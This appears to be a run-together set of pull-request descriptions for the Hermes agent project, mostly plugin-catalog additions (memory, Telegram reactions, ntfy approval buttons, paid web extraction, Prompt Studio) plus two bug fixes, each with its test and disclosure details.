  environment that carries no Hermes provider keys. Remote mode speaks MCP streamable HTTP to a
  TAM HTTP server or team server, with an optional `TAM_API_TOKEN`.
- No Python dependencies (stdlib only), no self-update, and no network calls in `is_available()`.
  If TAM is missing, slow or crashing, the provider degrades to an empty recall and queued writes;
  it never raises into Hermes.

## Related Issue

None. This is a catalog addition following CONTRIBUTING's standalone memory provider policy.

## Type of Change

- [x] ✨ New feature (non-breaking change that adds functionality)

## Changes Made

- `plugin-catalog/tam.yaml`: new `category: memory` entry pinned to `0adc0b966971df6be5118e8d64e450c80bb7abf3`, with `subdir: hermes_tam_memory`.

## How to Test

1. `python3 scripts/validate_plugin_catalog.py plugin-catalog/tam.yaml`
2. `hermes plugins validate <clone>/hermes_tam_memory` at `0adc0b966971df6be5118e8d64e450c80bb7abf3`: all checks pass, and the security
   scan reports `safe`.
3. `pipx install total-agent-memory`, `hermes plugins install tam`, `hermes memory setup tam`,
   chat twice. The second session's prompt includes the first session's turn under
   `## Recalled from total-agent-memory (TAM)`.

The plugin repo's CI runs unit tests against a scripted fake TAM on Linux and macOS, and
integration tests against TAM 14.6.0. The integration tests cover local stdio, TAM's HTTP
transport, and the team server with a Bearer token. I also verified the end-to-end flow above
with Hermes' `FakeLLMServer`.

`capabilities.provides_tools` lists `tam_recall` and `tam_save` for transparency. They are
memory-provider tools exposed through `get_tool_schemas()`, not `ctx.register_tool()`, so the
`register()` probe does not record them.

- [x] My commit messages follow Conventional Commits

A single proc_pidfdinfo call can block uninterruptibly in the kernel when a process sits in uninterruptible I/O on a dead network share. The darwin holder scan ran synchronously on the SessionDB connect path, so one stuck unrelated process froze every Hermes start indefinitely (#113187).

The whole darwin pass now runs in a daemon thread with a 5s wall-clock deadline; on expiry it logs a warning and returns no holders (fail open per the guard contract). A per-iteration time check cannot bound this: the block happens inside one call, which is also why open #115589 (per-iteration 1s budget for the many-fd slow case #115583) does not cover this hang -- different trigger, same file.

RED: blocking-fake libproc hangs pristine scan 50s+ with no deadline; new test fails on unfixed code (worker still alive past 30s hang guard). GREEN: 2 new tests pass (~6s); neighbors tests/hermes_state/test_deleted_wal_generation_guard.py green (8 passed, 18 platform-skipped).

Closes #113187

items.body:
## Summary

Adds **reaction-feedback** to the catalog. When a user reacts to one of the bot's Telegram messages, the agent's next turn in that private chat starts with a short note naming the reaction and the user message it followed. Today a 👍 or 👎 on a reply never reaches the agent (#18408, #34660, #27438, #13942).

It uses the plugin lane from #64176. `gateway_platform_event` supplies the reaction, `pre_gateway_dispatch` the user's message ids, and `pre_llm_call` the note. Telegram numbers a private chat as one sequence shared by both sides, so a reaction is attributed to the turn whose window contains the reacted message. The user's own messages, slash-command answers and messages older than the plugin has seen are ignored rather than guessed. The design and the Hermes facts it relies on, with file references, are in `docs/DESIGN.md` in the repo.

Four commits:
- `add reaction-feedback`, pinned to `a0fcc77`, version 1.0.0.
- `catalog card`, pinned to `14f339e`. That commit only adds `docs/card.png` and the plugin code is identical. The card is drawn inside the detail hero's visible band (rows 110–490).
- `bump reaction-feedback to 1.0.1`, pinned to `17e4156`: a reaction on the answer to a message with an `@file:`/`@url:` reference was dropped.
- `bump reaction-feedback to 1.0.2`, pinned to `50d8dbd`: in a private chat with topics, a reaction on one topic's answer could be noted in another topic's conversation.

Both fixes came from re-checking the plugin's Hermes assumptions against main after opening; see **Updates** below.

## Disclosure / footprint

- Three hooks. `register()` only registers them.
- The `pre_gateway_dispatch` callback always returns `None`, so dispatch is never changed.
- State is kept in memory, per profile and per private chat, and is bounded:
  - 200 message ids per chat, 20 pending reactions per chat, a 48 h TTL for pending reactions;
  - 256 chats per profile that have started a turn, and 32 that have not. `pre_gateway_dispatch` runs before auth, so messages from unauthorized users can only evict that second pool.
- Nothing is written to disk. No network requests, no subprocesses, no secrets read.
- The note goes into the user message. Hermes keeps the exact API string in the `api_content` sidecar and replays it byte for byte (tested, including a fresh agent rebuilt from `state.db`), so later turns keep the prompt cache.

## Verification

- `scripts/validate_plugin_catalog.py` (ruamel.yaml 0.18.17): OK at both commits.
- Replay of the catalog CI's pinned-source step at both pins (`a0fcc77`, `14f339e`):
  - clone and checkout OK, `plugin.yaml` found at the subdir;
  - `hermes plugins validate --install-deps` passes: declared hooks match registrations, security scan safe;
  - self-updater gate OK, and the subdir README is present and identical to the root one.
- The pinned `image` URL returns 200 `image/png`, and its bytes match the committed file (sha256).
- Install by name from this branch's catalog gives `pinned: true` at revision `14f339e`.
- Plugin repo CI, [run 36402983892](https://github.com/AhmetArif0/hermes-reaction-feedback/actions/runs/36402983892), 8/8:
  - unit jobs on Linux/macOS/Windows × py3.11/3.14: 70 passed each;
  - end-to-end on Hermes v2026.9.24 and main: 73 passed each, and `validate` passes.
- Tests:
  - 70 without Hermes and 73 with Hermes.
  - The end-to-end tests load the plugin through the real `PluginManager`, send real `MessageEvent`s through `pre_gateway_dispatch`, and replay reaction payloads captured from a live bot through `gateway_platform_event`.
  - Real `AIAgent` turns run against `FakeLLMServer`, which records exactly what reaches the model.
- Mutation: 34/34 mutants killed, one per attribution rule and filter.
- Live, in a private chat with a test bot on Hermes main:
  - Message ids are one shared sequence (user 12/14/16, bot 13/15/17).
  - Reactions on the bot's messages and on the user's own messages both arrive. ❤ arrives without U+FE0F.
  - With the plugin installed by name from this branch at `14f339e`, a 👎 on the reply to "bir" reached the next turn as `- 👎 on a message you sent after the user's "bir"`.

## Scope note

- Private chats only. Groups share one id sequence among many people, and Discord reactions are not delivered to plugins yet.
- The note says "a message you sent after …", because no documented hook reports the ids of messages Hermes sends. That window is usually the reply, but it can also hold a progress update or a cron delivery.
- Messages sent while a turn is running skip `pre_gateway_dispatch` (#121976). The README lists this.
- Private chats with topics (threaded mode, `/topic`): reactions are ignored while the chat's recent messages span more than one topic. Topics answer in parallel and share one id sequence, and the reaction payload carries no topic (`thread_id` is always `None`), so the reacted message's conversation can't be told. Exact attribution needs the ids of the messages Hermes sends (#95444 would provide them).

## Related

- Core PRs implement the same request in core: #23731 and #27451 (since May, keep_open, P3) and #81709 (August, opt-in inbound reactions plus a react tool). This entry adds no core code; if one of them lands, this plugin can be retired.
- Visiterius/hermes-telegram-reaction-commands (June) is a prototype for a different idea: reactions as commands. It was waiting for this hook and is not in the catalog.

## Updates

Two fixes found by re-checking each Hermes fact in `docs/DESIGN.md` against main `aa96575ed1` and v2026.9.24. Each is its own release with its own tests, so either pin can be taken alone.

| | Before (1.0.0) | After |
|---|---|---|
| 1.0.1: 👎 on the reply to `summarize @file:notes.txt` | not delivered: the turn text ends with Hermes' `--- Attached Context ---` block, so the typed-text suffix check never matched | delivered on the next turn |
| 1.0.2: topic A's reply (numbered after the user's message in topic B) gets 👎 | noted in topic B's next turn, quoting B's message | ignored; neither topic gets a wrong note |

- 1.0.1: the gateway's `_expand_inbound_context_references` keeps the typed text in place and appends `--- Context Warnings ---` / `--- Attached Context ---`; that expanded text is the turn's `persist_user_message`, which `pre_llm_call` receives. Reproduced through the gateway's real `_prepare_inbound_message_text` + `_hmwa_apply_message_timestamp` and a real `AIAgent` turn. A plain message was the control (delivered before and after).
- 1.0.2: private-chat topics keep `chat_type == "dm"` and carry `source.thread_id`; `_normalize_reaction_event` sets `thread_id: None` because `message_reaction` has no topic. `post_llm_call` fires before the reply is delivered and not at all for interrupted turns, so turn windows can't be closed precisely; the plugin declines instead of guessing. One topic keeps working as in a plain chat.
- Plugin CI, both green: 1.0.1 [run 36491514975](https://github.com/AhmetArif0/hermes-reaction-feedback/actions/runs/36491514975) 8/8 (unit 73 each, end-to-end 77 on v2026.9.24 and main); 1.0.2 [run 36491661079](https://github.com/AhmetArif0/hermes-reaction-feedback/actions/runs/36491661079) 8/8 (unit 77 each, end-to-end 82 on both).
- Mutation: 7/7 killed for the new rules (each expansion marker, the prefix candidates, the topic count and its threshold, the topic reaching the ledger from the hook and inside it).
- `validate_plugin_catalog.py` (ruamel.yaml 0.18.17): OK at both new commits. Pinned-source replay from GitHub at `17e4156` and `50d8dbd` with this branch's Hermes: `hermes plugins validate --install-deps` passes, self-updater gate OK, subdir README present and identical to the root one. The README URLs for both pins return 200; `image` stays at `14f339e` (the card is unchanged).
- Not changed: with `compression.in_place: false` (not the default) a compaction rotates the session id and pending feedback from before it is dropped; following that lineage would need a `state.db` read, which the plugin does not do.

`consume_prepared_guard` reuses a prepared approval only when a human answered it, or when it is a Smart-mode APPROVE and Smart mode is still selected. ## Summary

Adds **ntfy-approval** to the catalog. With `security.approval.transport: ntfy`, Hermes' approval prompts (flagged terminal commands and `execute_code`) arrive on the user's phone as an ntfy notification with **Approve once**, **Approve for session** and **Deny** buttons. Today a prompt can only be answered at the terminal or in the chat. The catalog plugins that forward prompts (telegram-notify, needs-you, done-bell) only notify; telegram-notify's entry says "Outbound-only, no input channel".

It is built on the approval transport interface (`register_approval_transport`, de56e49a7c / cd7c674d74). The buttons are ntfy `http` actions: the phone posts a one-time answer code to `<topic>-reply` on the same ntfy server, and the plugin reads that topic, so nothing listens on the Hermes machine. Detection, redaction, request binding, allowed scopes, timeout and the final decision stay with the host; the plugin only returns `request.respond(choice)`. The design and the Hermes and ntfy facts it relies on are in `docs/DESIGN.md` in the repo.

Three commits:
- `add ntfy-approval`, pinned to `e6d5570`, version 1.0.0.
- `catalog card`, which adds `image` at the same pin. The image is `docs/card.png`, outside the plugin directory. It is drawn inside the detail hero's visible band (rows 110–490); I checked this on the live site at six widths in both themes, plus the grid card.
- `bump ntfy-approval to 1.0.1`, pinned to `95d3a4b`: stopping a turn while an approval is on the phone now withdraws the notification at once (see **Updates**).

## Disclosure / footprint

- `register()` only registers the `ntfy` transport, which stays inactive until selected, the `hermes ntfy-approval setup|test` command, and (since 1.0.1) one `post_approval_response` observer that only withdraws the notification of a request Hermes stopped waiting for. No tools or middleware.
- Network goes only to the configured ntfy server (default `https://ntfy.sh`), and only while an approval (or `test`) is pending: one JSON publish, one stream on the reply topic, and one `DELETE` to withdraw the notification afterwards. Standard library `urllib` only; redirects are refused and responses are size-capped.
- What leaves the machine: Hermes' reason for asking, the command as Hermes redacted it (`send_command: false` leaves it out), and three one-time answer codes. The access token is never put in a notification.
- Secrets: `NTFY_APPROVAL_TOPIC` and `NTFY_APPROVAL_TOKEN` are `config_schema` secrets, so they live in `.env`. They are read through `agent.secret_scope` when it is importable, falling back to `os.environ`. Without a token the topic must be at least 16 characters; `setup` prints a 39-character random one.
- No file writes, subprocesses, threads or config writes. `setup` prints the `hermes config set` commands for the user to run.
- It fails closed: any error raises, and the host turns that into a denial. An answer counts only if both the request id and the tapped button's code match (`hmac.compare_digest`). `always` is never offered: ntfy fits three buttons, and permanent allowlisting from a lock screen is left to the keyboard.
- Profiles: the host runs transports on a bare worker thread without the routed profile's context (#114580). The plugin compares `get_hermes_home()` with the home it captured at registration and refuses a mismatch instead of using another profile's topic.

## Verification

- `scripts/validate_plugin_catalog.py` (ruamel.yaml 0.18.17): OK at both commits.
- Replay of the catalog CI's pinned-source step at `e6d5570`, using this branch's Hermes:
  - clone and checkout OK, `plugin.yaml` found at the subdir;
  - `hermes plugins validate --install-deps` passes and the security scan is safe;
  - the self-updater gate is OK, and the subdir README is present and identical to the root one.
- The pinned `image` URL returns 200 `image/png`, and its bytes match the committed file (sha256). The README URL from `readme_url()` returns 200 with identical bytes.
- Install by name from this branch's catalog gives `pinned @ e6d55707`, and `plugins search ntfy` lists it under automation.
- Plugin repo CI, [run 36414265155](https://github.com/AhmetArif0/hermes-ntfy-approval/actions/runs/36414265155), 9/9:
  - unit jobs on Linux/macOS/Windows × py3.11/3.14: 74 passed each;
  - against a real ntfy 2.28 server: 67 passed. This includes the README's access-control recipe: deny-all, a token that owns the topic, and a write-only reply topic for everyone.
  - end-to-end on Hermes v2026.9.24 and main: 86 passed each, and `validate` passes.
- The end-to-end tests patch nothing on the host side:
  - they load the plugin through the real `PluginManager` and go through the real gate, `check_all_command_guards`, with its detection, redaction, binding and timeout;
  - the phone is simulated by running the notification's own `http` action;
  - they run the real `hermes` CLI as subprocesses: `setup`, `config set`, `test`;
  - real `AIAgent` turns run against `FakeLLMServer`: Approve lets the terminal command run, and Deny returns BLOCKED and the directory survives.
- The suite also passes on this branch's base (`614b9b3f3c`) and on `refactor/remove-plugin-compat-layer`.
- Mutation: 24/24 mutants killed, one per check. They cover the request id, the per-button codes, never offering `always`, no token in a notification, refused redirects, the profile guard, withdrawal, resuming the stream with `since`, and the deadline.
- Live: I installed the pinned copy from GitHub and ran `hermes ntfy-approval test` against a real ntfy 2.28 server. The notification arrived with the three buttons, the tap came back as "Approve for session", and a `message_delete` then withdrew the notification.

## Scope note

- Interactive sessions only. The host consults transports for the CLI, TUI and ACP and for gateway chats. Cron, `-q` and unattended platforms resolve from `approvals.*_mode` before any transport.
- Once selected, ntfy replaces the chat buttons too; that is how the host treats a selected transport. `transport_fallback: builtin` covers an ntfy outage.
- On a multi-profile gateway, approvals are denied until #114580 carries the routed context into the transport worker. The README says so.
- Protected writes and the action gate are not routed to transports by the host (#120859, #121872), so they keep the built-in prompt.
- ntfy servers older than 2.16 ignore the withdrawal. The stale buttons then do nothing.
- Not tried on a physical phone. The phone's part is the ntfy app's `http` action, which the tests run with the same method, URL and body. In the ntfy-ios source, `ActionExecutor` POSTs the action body the same way.

## Related

- #103083 (open, P3) adds `Click`/`Actions` headers to the core ntfy adapter. Its buttons post to a gateway URL that the phone must be able to reach. This plugin needs no inbound reachability and also covers CLI sessions.
- #124063 (open) adds Mattermost approval buttons with an ntfy escalation link.
- The other transports I found on GitHub target specific devices (RobSpectre/hermes-watch for Wear OS, a tablet relay, the bighelp iPhone app); none of them is in the catalog.

## Updates

1.0.1 fixes what a stopped turn left on the phone. The host ends its wait at once on `/stop` or Ctrl-C (`is_interrupted` → deny `interrupted`), but the transport worker is not told, so it kept waiting for the phone until `approvals.timeout`. Right after every wait the host fires `post_approval_response` on the calling thread with the request's `request_id` (v2026.9.24 and main); the plugin now uses it to withdraw that notification before the host moves on.

Reproduced with the real gate (`check_all_command_guards`), the real interrupt (`tools.interrupt.set_interrupt` on the waiting thread) and a notification on the topic:

| | Before (1.0.0) | After (1.0.1) |
|---|---|---|
| Hermes keeps running after the stop | buttons stay until the timeout (30 s in the repro, 300 s by default) | withdrawn 1.0 s after the stop, when the host returns |
| The process exits right after the stop | never withdrawn: live buttons stay on the phone | withdrawn before exit |

- Exactly one `DELETE` per request: whichever of the worker and the hook takes the request out of the plugin's table withdraws it. A stop that lands while the reply stream opens sends nothing; one that lands during the publish withdraws right after it. The hook's `DELETE` is capped at 3 s and only runs for a request still pending (never after a normal answer). No threads or locks are added.
- The catalog entry now lists `post_approval_response` under `provides_hooks` and in the disclosure; `image` stays at `e6d5570` (the card is unchanged).
- Plugin CI [run 36491685594](https://github.com/AhmetArif0/hermes-ntfy-approval/actions/runs/36491685594) 9/9: unit 77 each on Linux/macOS/Windows × py3.11/3.14; real ntfy 2.28: 70 (open server and the access-control recipe); end-to-end on v2026.9.24 and main: 90 each. The real-ntfy job's access-control test timed out waiting for the notification on the first attempt and passed on re-run; that path is unchanged in 1.0.1, and it passed in 12 local runs with the CI's server flags.
- Mutation: 10/10 killed (hook registration, the hook's request id, the withdrawal in the hook, the worker's stop checks, the publish guard, exactly-once withdrawal, the worker's cleanup, the stopped error).
- `validate_plugin_catalog.py` (ruamel.yaml 0.18.17): OK. Pinned-source replay from GitHub at `95d3a4b` with this branch's Hermes: `hermes plugins validate --install-deps` passes, self-updater gate OK, subdir README present and identical to the root one; its README URL returns 200.

> Updated 2026-09-30: pin moved `a91a4cc2` → `493df020496d2782d3fe15308cc3b6672c2224c4` so the
> catalog adopts the fastfinge/hermes-session-reset-policy#4 policy-reader fix along with the
> `/new` funnel change (the issue thread suggested shipping both together). The text below
> reflects the final pin.

## What

Pin bump for the `hermes-session-reset-policy` catalog entry (plugin-catalog README rule 4). I'm the plugin owner/maintainer, so I keep control of the entry.

Only two fields change, so the diff for re-review is minimal:

- `sha:` 40-hex `bb618e082318fef69d388ae2ceae29e914ea36b8` → `493df020496d2782d3fe15308cc3b6672c2224c4` (the README rule 2 exact-40-hex form)
- `version:` `0.2.0` → `0.3.0` (matches `plugin.yaml` at the new pin)

## Upstream commit range being adopted (rule 4 re-review)

`bb618e082318fef69d388ae2ceae29e914ea36b8...493df020496d2782d3fe15308cc3b6672c2224c4` — two commits:

- **`a91a4cc` — Reset via the gateway `/new` funnel: boundary hooks, scope clear, delegation interrupt (review #2)**

  Behaviour change behind the same one-line `provides_hooks: [pre_gateway_dispatch]` surface: the plugin now routes its reset through the gateway's own `/new` reset *funnel* (`gateway._handle_reset_command`, fed a text-free event) rather than a bare `SessionStore.reset_session()`, so a policy reset also does the run-generation bump + cached-agent cleanup/eviction, conversation-scope clear (per-conversation `/model` + reasoning overrides), interruption of in-flight async delegations, the durable store rotation, and the `session:end`/`session:reset` + `on_session_finalize`/`on_session_reset` boundary hooks. When the funnel isn't reachable it degrades to the bare store rotation plus the lifecycle hook pair and delegation interrupt. Session-key resolution uses the hook payload's `session_key` (future public surface) else `gateway._session_key_for_source`; deliberately **no** bare `build_session_key` fallback (that key isn't profile-namespaced under profile muxing and could reset another profile's route).

  Files: `__init__.py`, `plugin.yaml`, `tests/test_session_reset_policy.py`, `requirements-dev.txt`, `.github/workflows/pytest.yml`, `README.md`.

- **`493df02` — fix(policy-reader): resolve profile homes via get_profile_dir (#4)**

  Bug fix for fastfinge/hermes-session-reset-policy#4: a profile that runs its own gateway
  (standalone, `HERMES_HOME` already set to that profile's own dir) made the policy reader build
  `<home>/profiles/<name>` — double-nesting to `profiles/alpha/profiles/alpha/config.yaml` — so
  tagged sources (`source.profile`) found no `session_reset` block and the plugin silently did
  nothing. The reader now resolves the profile home through `hermes_cli.profiles.get_profile_dir`
  (anchored at the Hermes root, normalizes/cases names safely, and maps `default` to the root home,
  which is that profile's home), matching how the gateway itself scopes profiles. A regression test
  drives the full per-profile-home × root-home matrix against the real config loader, and the suite
  fixture pins `HERMES_DATA_DIR_SUFFIX` so root inference stays hermetic on hosts whose `TMPDIR`
  sits under the native `~/.hermes` (otherwise profile names resolve into the LIVE `profiles/` dir).

  Files: `__init__.py`, `tests/test_session_reset_policy.py`, `README.md`.

## Rule 6/declared-capabilities check

`capabilities` is unchanged and still matches reality at the new pin (verified against `__init__.py` @ `493df02`):

- `provides_hooks: [pre_gateway_dispatch]` — `register()` wires exactly this one hook; `on_session_finalize`/`on_session_reset` are *fired downstream*, not registered.
- `provides_tools`, `provides_middleware`, `requires_env`: all `[]` — no `Tool(`/`middleware`/`os.environ`/`os.getenv`/`getenv` at the pin.

So no capability field needs to change. Exact-40-hex pin preserved per rule 2 (verified `[0-9a-f]{40}`).

## Verification at the new pin (493df02)

- `hermes plugins doctor <dir>`: OK — runtime discovery, manifest parsing, import and registration passed; registrations: 0 tool(s), 1 hook(s).
- Test suite: **32 passed** locally (Python 3.14 against the `~/.hermes/hermes-agent` tree); the plugin repo's CI matrix (3.13/3.14) is green at this exact sha.
- Issue #4 repro (scratch root, `idle_minutes` root=111 / alpha=222 / beta=333, reading `_read_session_reset_policy`):

  | `<root>/profiles/alpha` | `alpha` | None (bug) | 222 |
  | `<root>/profiles/alpha` | `beta` | None (bug) | 333 |
  | `<root>/profiles/alpha` | None | 222 | 222 |
  | `<root>` | `alpha` | 222 | 222 |
  | `<root>` | `beta` | 333 | 333 |
  | `<root>` | None | 111 | 111 |

- CI state note: the first push from an outside collaborator parks every workflow at
  `action_required` awaiting maintainer approval — expected for this PR, not a red CI.

## What does this PR do?

Saving a legacy `custom_providers:` endpoint from Desktop Settings (or `POST /api/providers/custom-endpoints` with `api_key` omitted) forked a new `providers.<id>` entry and dropped the credential. The writer only looked inside `providers`, and the plaintext-`api_key` migration never copied `key_env`. The legacy list row stayed, so the config held two entries and the new one had no key. The next request through that endpoint failed with 401.

The save now, when no `providers` entry matches, lifts the legacy list row through the same v12 conversion activate already uses (`key_env` included) and removes that list row. A new key typed in the panel still replaces the env var. An omitted key leaves the existing `key_env` in place. A row that cannot be converted is put back on the list.

## Related Issue

Fixes #126589

## Type of Change

- [x] 🐛 Bug fix (non-breaking change that fixes an issue)
- [ ] ✨ New feature (non-breaking change that adds functionality)
- [ ] 🔒 Security fix
- [ ] 📝 Documentation update
- [ ] ✅ Tests (adding or improving test coverage)
- [ ] ♻️ Refactor (no behavior change)
- [ ] 🎯 New skill (bundled or hub)

## Changes Made

- `hermes_cli/web_routers/config_env.py` (`_write_custom_endpoint`): promote a matching legacy `custom_providers` row, including `key_env`, and drop it from the list.
- `tests/hermes_cli/test_web_server.py`: save of a `key_env` legacy row keeps that env name on `providers.qwen-local` and clears `custom_providers`.

## How to Test

```bash
uv run --group dev python -m pytest \
  tests/hermes_cli/test_web_server.py::TestWebServerEndpoints::test_saving_legacy_custom_provider_keeps_key_env \
  tests/hermes_cli/test_web_server.py::TestWebServerEndpoints::test_legacy_custom_providers_entries_get_a_row_and_can_be_deleted \
  tests/hermes_cli/test_web_server.py::TestWebServerEndpoints::test_activating_a_legacy_custom_providers_entry_promotes_it \
  -q
```

3 passed.

Without the writer change, `test_saving_legacy_custom_provider_keeps_key_env` failed: `custom_providers` still held the Qwen Local row after save.

`uv run --group dev ruff check hermes_cli/web_routers/config_env.py tests/hermes_cli/test_web_server.py` passed. The full `pytest tests/ -q` suite was not run.

## What does this PR do?

Adds `plugin-catalog/hermes-toon.yaml`. Owner submission (catalog rule 5): I maintain [drew-dot-com/hermes-toon](https://github.com/drew-dot-com/hermes-toon) and the node it pays.

hermes-toon registers a `toon` web provider, extract only (`web.extract_backend: toon`). Each `web_extract` is one `GET /extract?url=` against a local payer sidecar, which pays a [TOON](https://github.com/toon-protocol) node one micropayment (about $0.001 in USDC, off-chain claim on a payment channel). The node fetches the page through an [Anyone network](https://anyone.io) exit and answers with the page as markdown plus a content hash under [wuzzy/crawl v1](https://github.com/memetic-block/wuzzy/blob/main/VERIFY.md), so the result carries a hash an independent fetch can be checked against. The destination sees an Anyone exit, not the user's IP.

The plugin itself has one dependency (`httpx>=0.27,<0.29`, bounded), registers no tools, hooks or middleware, does not update itself, and talks only to the sidecar URL in `TOON_PAYER_URL`. The sidecar ([anonfetch/payer](https://github.com/drew-dot-com/anonfetch/tree/main/payer)) holds the wallet and the spending rules: a daily cap, a per-fetch price ceiling and an origin allowlist.

Disclosure, also in the entry's description and the README: with `TOON_PAYER_URL` set and `toon` selected, every `web_extract` spends from the sidecar's channel with no per-call confirmation, up to the sidecar's daily cap (default $0.10) and only for its allowed origins when that list is set. Same shape as `hermes-mpp`'s disclosure.

## Related Issue

None. Catalog entry only.

## Type of Change

- [x] ✨ New feature (non-breaking change that adds functionality). New catalog entry.

## Changes Made

- `plugin-catalog/hermes-toon.yaml`: repo `drew-dot-com/hermes-toon` @ `fb0892bd1ee6630309adeeaa68fd37454be247d3` (0.1.2), subdir `src/hermes_toon`, community tier, category `web`, `requires_env: [TOON_PAYER_URL]`, no tools/hooks/middleware. Copied from the plugin's `plugin.yaml` at that SHA.

## How to Test

1. `python3 scripts/validate_plugin_catalog.py plugin-catalog/` prints `OK: 350 file(s) valid`.
2. Check out the pinned SHA and run `hermes plugins validate --install-deps src/hermes_toon`: manifest, capability probe, declared tools/hooks/middleware match registrations, security scan `safe`, `Validation passed.`
3. Run the sidecar (`anonfetch/payer`, needs a Solana mainnet keypair with a little USDC), set `TOON_PAYER_URL=http://127.0.0.1:3502` and `web.extract_backend: toon`, then ask the agent to read a page. The entry comes back with `metadata.content_hash`, `metadata.raw_hash`, `metadata.exit: anyone` and `metadata.price`; since `web_extract` passes the model only url/title/content/error, the same receipt (price, exit, content hash, job id) is also appended to the page text. Tested 10-01 on a clean `install.sh` Hermes (main) with Gemini: install from URL, `plugins enable`, one paid extract, receipt quoted back by the model.

The plugin's suite (8 tests) runs with stubbed Hermes helpers or against a real checkout via `HERMES_SRC`; both pass on v2026.9.24. Tested on macOS 26.

items.body:
## What does this PR do?

Adds Prompt Studio to the community plugin catalog. Prompt Studio is a Hermes Desktop plugin that turns a rough
request into a well-built prompt for Claude Opus 5.5 or GPT-6 Astra. It asks the few questions that change the
result, one step at a time, with a recommended answer and an optional AI suggestion on each step, then writes the
prompt and either sends it (F9) or places it in the composer for editing (Alt+E). Everything is keyboard-driven.

I am the owner and only maintainer of https://github.com/bwoliveira/prompt-studio.

- Pinned to the full commit SHA of release v1.8.0 (`51bd9330d4841de13624d3315cb4bec66434b71d`), not the annotated tag object.
- Unified package: `plugin.yaml` + `__init__.py` (registers one auxiliary task, `prompt_studio`), a dashboard API
  router (`dashboard/manifest.json`, `plugin_api.py`) and a Desktop half (`desktop/plugin.js`), all with the id
  `prompt-studio`.
- `capabilities` are empty: no tools, hooks, middleware or required env vars. The only agent-side registration is
  the auxiliary task, so users can route it with `auxiliary.prompt_studio.*`.
- Desktop half imports only `@hermes/plugin-sdk`; it reads and writes the message field only through
  `host.composer` (no app DOM, no internal stores, no `hermes:composer-*` events), listeners go through
  `ctx.addEventListener`, timers through `ctx.setTimeout`, preferences through `ctx.storage`, colors through theme
  variables. No `eval`/`new Function`, no network outside the SDK/plugin API,
  no self-updating code.
- Model calls: the dashboard backend calls Hermes's auxiliary client routed by its own `prompt_studio` task, not
  `ctx.llm` yet. In this Hermes, `ctx.llm.complete()` has no reasoning-effort option and denies a per-call `model=`
  unless the operator sets `plugins.entries.prompt-studio.llm.allow_model_override`, so the per-request model
  choice in the plugin's Settings would stop working on a default install. The README states this. Credential
  resolution stays with Hermes; the plugin does not ask for or store API keys.
- The plugin sends no temperature or other sampling parameters; Hermes decides them for each model.
- `requires_hermes: ">=0.21.5"`, because `host.composer` first ships in Hermes Desktop 0.21.5. On an older Desktop the
  bundle still loads (checked against the SDK export lists of 0.20.0 and 0.21.4) and the Studio shows an "update
  Hermes" notice instead of opening. Run for real on 0.21.5.
- Attachments: the SDK has no attachment API, so the plugin does not read or copy them. They stay in the composer and
  go with the prompt when it is placed there (Alt+E); "Send now" (`host.composer.submit`) sends text only, and the
  preview says so.

## Changes Made

- `plugin-catalog/prompt-studio.yaml`: new community entry (tier `community`, category `desktop`, version `1.8.0`,
  2:1 card image and three screenshots, all pinned to the same SHA).

## How to Test

1. `python3 scripts/validate_plugin_catalog.py plugin-catalog/`
2. Pinned source validation (what `plugin-catalog-ci.yml` runs):
